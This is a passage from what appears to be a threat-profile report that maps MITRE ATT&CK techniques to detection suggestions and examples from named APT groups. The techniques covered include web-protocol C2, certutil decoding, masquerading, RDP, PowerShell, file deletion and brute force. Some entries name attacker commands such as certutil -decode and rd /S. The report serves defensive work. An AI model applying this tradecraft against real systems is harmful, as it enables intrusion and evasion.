Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), as well as through cloud APIs and command line interfaces.
#### Examples: 
- APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[[1]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf)
- menuPass has used the Csvde tool to collect Active Directory files and data.[[2]](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)
### [Application Layer Protocol: Web Protocols (T1071.001)](https://attack.mitre.org/techniques/T1071/001)
#### Score: 20
#### Description:
Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. 
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Network Traffic: Network Traffic Content
- Network Traffic: Network Traffic Flow
### Detection Suggestions:
Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)

Monitor for web traffic to/from known-bad or suspicious domains. 
#### Examples: 
- Later implants used by APT28, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration.[[1]](https://web.archive.org/web/20151022204649/https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf)[[2]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- APT33 has used HTTP for command and control.[[3]](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)
- APT37 uses HTTPS to conceal C2 communications.[[4]](https://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html)
- Lazarus Group has conducted C2 over HTTP and HTTPS.[[5]](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/lazarus-resurfaces-targets-global-banks-bitcoin-users/)[[6]](https://www.sentinelone.com/blog/four-distinct-families-of-lazarus-malware-target-apples-macos-platform/)[[7]](https://blog.trendmicro.com/trendlabs-security-intelligence/new-macos-dacls-rat-backdoor-show-lazarus-multi-platform-attack-capability/)[[8]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)[[9]](https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns)[[10]](https://x.com/ESETresearch/status/1458438155149922312)
### [Deobfuscate/Decode Files or Information (T1140)](https://attack.mitre.org/techniques/T1140)
#### Score: 20
#### Description:
Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.

One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)

Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Process: Process Creation
- Script: Script Execution
- File: File Modification
### Detection Suggestions:
Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).

Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.
#### Examples: 
- An APT28 macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.[[1]](https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/)[[2]](https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/)
- Lazarus Group has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime.[[3]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)[[4]](https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns)
- menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victim’s machine when dropping UPPERCUT.[[5]](http://web.archive.org/web/20220810112638/https:/www.accenture.com/t20180423T055005Z_w_/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf)[[6]](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)
- Volt Typhoon has used Base64-encoded data to transfer payloads and commands, including deobfuscation via certutil.[[7]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)
### [Masquerading (T1036)](https://attack.mitre.org/techniques/T1036)
#### Score: 20
#### Description:
Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- File: File Modification
- Process: Process Metadata
- Service: Service Creation
- Service: Service Metadata
- Process: Process Creation
- Image: Image Metadata
- Scheduled Job: Scheduled Job Metadata
- User Account: User Account Creation
- File: File Metadata
- Scheduled Job: Scheduled Job Modification
- Command: Command Execution
- Process: OS API Execution
### Detection Suggestions:
Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.

If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)

Look for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters"\u202E", "[U+202E]", and "%E2%80%AE”.
#### Examples: 
- APT28 has renamed the WinRAR utility to avoid detection.[[1]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- menuPass has used esentutl to change file extensions to their true type that were masquerading as .txt files.[[2]](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)
### [Remote Services: Remote Desktop Protocol (T1021.001)](https://attack.mitre.org/techniques/T1021/001)
#### Score: 20
#### Description:
Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.

Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) 

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Network Traffic: Network Traffic Flow
- Logon Session: Logon Session Creation
- Network Traffic: Network Connection Creation
- Process: Process Creation
- Logon Session: Logon Session Metadata
### Detection Suggestions:
Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.
#### Examples: 
- Lazarus Group malware SierraCharlie uses RDP for propagation.[[1]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[2]](https://web.archive.org/web/20220608001455/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf)
- menuPass has used RDP connections to move across the victim network.[[3]](https://web.archive.org/web/20220224041316/https:/www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)[[4]](https://www.justice.gov/opa/page/file/1122671/download)
- Volt Typhoon has moved laterally to the Domain Controller via RDP using a compromised account with domain administrator privileges.[[5]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Command and Scripting Interpreter: PowerShell (T1059.001)](https://attack.mitre.org/techniques/T1059/001)
#### Score: 20
#### Description:
Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Script: Script Execution
- Process: Process Creation
- Process: Process Metadata
- Command: Command Execution
- Module: Module Load
### Detection Suggestions:
If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.

Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)

It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.

Consider monitoring for Windows event ID (EID) 400, which shows the version of PowerShell executing in the <code>EngineVersion</code> field (which may also be relevant to detecting a potential [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)) as well as if PowerShell is running locally or remotely in the <code>HostName</code> field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.(Citation: inv_ps_attacks)
#### Examples: 
- APT28 downloads and executes PowerShell scripts and performs PowerShell commands.[[1]](https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/)[[2]](https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html)[[3]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- APT33 has utilized PowerShell to download files from the C2 server and run various scripts. [[4]](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)[[5]](https://www.microsoft.com/security/blog/2020/06/18/inside-microsoft-threat-protection-mapping-attack-chains-from-cloud-to-endpoint/)
- Lazarus Group has used PowerShell to execute commands and malicious code.[[6]](https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/)
- menuPass uses PowerSploit to inject shellcode into PowerShell.[[7]](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf)[[8]](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)
- Volt Typhoon has used PowerShell including for remote system discovery.[[9]](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)[[10]](https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF)[[11]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Indicator Removal: File Deletion (T1070.004)](https://attack.mitre.org/techniques/T1070/004)
#### Score: 20
#### Description:
Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows, <code>rm</code> or <code>unlink</code> on Linux and macOS, and `rm` on ESXi.
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Command: Command Execution
- File: File Deletion
### Detection Suggestions:
It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.
#### Examples: 
- APT28 has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.[[1]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf)
- Lazarus Group malware has deleted files in various ways, including "suicide scripts" to delete malware binaries from the victim. Lazarus Group also uses secure file deletion to delete files from the victim.[[2]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[3]](https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/)
- A menuPass macro deletes files after it has decoded and decompressed them.[[4]](http://web.archive.org/web/20220810112638/https:/www.accenture.com/t20180423T055005Z_w_/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf)[[5]](https://www.justice.gov/opa/page/file/1122671/download)
- Volt Typhoon has run rd /S to delete their working directories and deleted systeminfo.dat from C:\Users\Public\Documentsfiles.[[6]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)[[7]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [User Execution: Malicious File (T1204.002)](https://attack.mitre.org/techniques/T1204/002)
#### Score: 20
#### Description:
An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.

Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) 

While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Process: Process Creation
- File: File Creation
### Detection Suggestions:
Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.

Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).
#### Examples: 
- APT28 attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.[[1]](https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/)[[2]](https://www.accenture.com/t20181129T203820Z__w__/us-en/_acnmedia/PDF-90/Accenture-snakemackerel-delivers-zekapab-malware.pdf#zoom=50)[[3]](https://www.secureworks.com/research/iron-twilight-supports-active-measures)
- APT33 has used malicious e-mail attachments to lure victims into executing malware.[[4]](https://www.microsoft.com/security/blog/2020/06/18/inside-microsoft-threat-protection-mapping-attack-chains-from-cloud-to-endpoint/)
- APT37 has sent spearphishing attachments attempting to get a user to open them.[[5]](https://services.google.com/fh/files/misc/apt37-reaper-the-overlooked-north-korean-actor.pdf)
- Lazarus Group has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.[[6]](https://securingtomorrow.mcafee.com/mcafee-labs/hidden-cobra-targets-turkish-financial-sector-new-bankshot-implant/)[[7]](https://securelist.com/lazarus-threatneedle/100803/)[[8]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)[[9]](https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns)
- menuPass has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents, sent via email as part of spearphishing campaigns.[[10]](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf)[[11]](https://www.fireeye.com/blog/threat-research/2017/04/apt10_menupass_grou.html)[[12]](http://web.archive.org/web/20220810112638/https:/www.accenture.com/t20180423T055005Z_w_/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf)[[13]](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)[[14]](https://www.justice.gov/opa/page/file/1122671/download)
### [User Execution: Malicious Link (T1204.001)](https://attack.mitre.org/techniques/T1204/001)
#### Score: 20
#### Description:
An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).
#### Raleigh Space Systems Analysis: 
### Data Sources:
- File: File Creation
- Network Traffic: Network Traffic Content
- Network Traffic: Network Connection Creation
### Detection Suggestions:
Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.

Anti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.
#### Examples: 
- APT28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.[[1]](https://www.justice.gov/opa/page/file/1098481/download)[[2]](https://www.secureworks.com/research/iron-twilight-supports-active-measures)
- APT33 has lured users to click links to malicious HTML applications delivered via spearphishing emails.[[3]](https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html)[[4]](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)
### [Process Discovery (T1057)](https://attack.mitre.org/techniques/T1057)
#### Score: 20
#### Description:
Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. ESXi also supports use of the `ps` command, as well as `esxcli system process list`.(Citation: Sygnia ESXi Ransomware 2025)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)

On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Process: Process Creation
- Process: OS API Execution
- Command: Command Execution
### Detection Suggestions:
System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Normal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

For network infrastructure devices, collect AAA logging to monitor for `show` commands being run by non-standard users from non-standard locations.
#### Examples: 
- An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.[[1]](https://pan-unit42.github.io/playbook_viewer/)
- APT37's Freenki malware lists running processes using the Microsoft Windows API.[[2]](https://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html)
- Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by Lazarus Group also gathers process times.[[3]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[4]](https://web.archive.org/web/20190508165631/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Loaders-Installers-and-Uninstallers-Report.pdf)[[5]](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/lazarus-resurfaces-targets-global-banks-bitcoin-users/)[[6]](https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/)[[7]](https://blog.trendmicro.com/trendlabs-security-intelligence/new-macos-dacls-rat-backdoor-show-lazarus-multi-platform-attack-capability/)[[8]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)
- Volt Typhoon has enumerated running processes on targeted systems including through the use of Tasklist.[[9]](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)[[10]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)[[11]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Brute Force (T1110)](https://attack.mitre.org/techniques/T1110)
#### Score: 20
#### Description:
Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.

Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.
#### Raleigh Space Systems Analysis: 
### Data Sources:
- User Account: User Account Authentication
- Command: Command Execution
- Application Log: Application Log Content
### Detection Suggestions:
Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.
#### Examples: 
- APT28 can perform brute force attacks to obtain credentials.[[2]](https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html)[[2]](https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html)[[3]](https://blogs.microsoft.com/on-the-issues/2020/09/10/cyberattacks-us-elections-trump-biden/)
### [Valid Accounts (T1078)](https://attack.mitre.org/techniques/T1078)
#### Score: 20
#### Description:
Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Logon Session: Logon Session Creation
- User Account: User Account Authentication
- Logon Session: Logon Session Metadata
### Detection Suggestions:
Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).

Perform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.
#### Examples: 
- APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.[[1]](https://documents.trendmicro.com/assets/wp/wp-two-years-of-pawn-storm.pdf)[[2]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf)[[3]](https://msrc-blog.microsoft.com/2019/08/05/corporate-iot-a-path-to-intrusion/)[[4]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- APT33 has used valid accounts for initial access and privilege escalation.[[5]](https://www.brighttalk.com/webcast/10703/275683)[[6]](https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html)
